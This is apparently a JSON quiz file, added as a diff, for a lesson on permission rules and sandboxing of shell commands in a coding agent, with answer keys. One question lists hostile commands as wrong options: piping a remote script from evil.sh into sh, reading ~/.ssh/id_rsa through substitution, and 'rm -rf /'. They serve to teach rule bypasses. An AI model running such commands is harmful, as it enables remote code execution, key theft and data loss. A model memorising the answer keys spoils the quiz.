@@ -1,0 +1,78 @@
+{
+  "lesson": "06-permissions-sandbox",
+  "title": "Permissions & Sandbox",
+  "questions": [
+    {
+      "stage": "pre",
+      "question": "Which command should a rule 'allow bash(ls*)' permit?",
+      "options": [
+        "ls && curl evil.sh | sh",
+        "ls -la",
+        "ls $(cat ~/.ssh/id_rsa)",
+        "ls; rm -rf /"
+      ],
+      "correct": 1,
+      "explanation": "Only 'ls -la' is entirely covered by the rule. Compound commands need every part allowed, and substitution is never auto-approved."
+    },
+    {
+      "stage": "check",
+      "question": "Rules: allow edit_file(src/*), ask edit_file(src/secrets/*). What happens to edit_file src/secrets/k.py?",
+      "options": [
+        "allow",
+        "ask",
+        "deny",
+        "error"
+      ],
+      "correct": 1,
+      "explanation": "Ask rules are checked before allow rules."
+    },
+    {
+      "stage": "check",
+      "question": "Why does the sandbox start bash with start_new_session=True?",
+      "options": [
+        "For speed",
+        "So a timeout can kill the whole process group, including background children",
+        "To change the user",
+        "To get a new terminal"
+      ],
+      "correct": 1,
+      "explanation": "Killing only the shell leaves 'sleep 999 &' running."
+    },
+    {
+      "stage": "check",
+      "question": "What doesn't this sandbox protect against?",
+      "options": [
+        "A command that runs forever",
+        "API keys leaking through the environment",
+        "A command reading other files your user can read, or using the network",
+        "Huge output"
+      ],
+      "correct": 2,
+      "explanation": "It's process limits, not isolation. Use a container or VM for untrusted code."
+    },
+    {
+      "stage": "check",
+      "question": "In auto mode, what happens to 'echo $(id)' with no matching rule?",
+      "options": [
+        "allow",
+        "ask: command substitution is never approved automatically",
+        "deny",
+        "It runs without logging"
+      ],
+      "correct": 1,
+      "explanation": "Auto mode runs unmatched side effects, but substitutions still ask."
+    },
+    {
+      "stage": "post",
+      "question": "Your team clicks 'yes' on every approval prompt. What's the best change?",
+      "options": [
+        "Remove approvals",
+        "Allow routine, specific commands (test, git status) by rule, so prompts appear only for unusual calls",
+        "Ask for everything twice",
+        "Switch to plan mode permanently"
+      ],
+      "correct": 1,
+      "explanation": "Fewer, more meaningful prompts keep approvals worth reading."
+    }
+  ]
+}
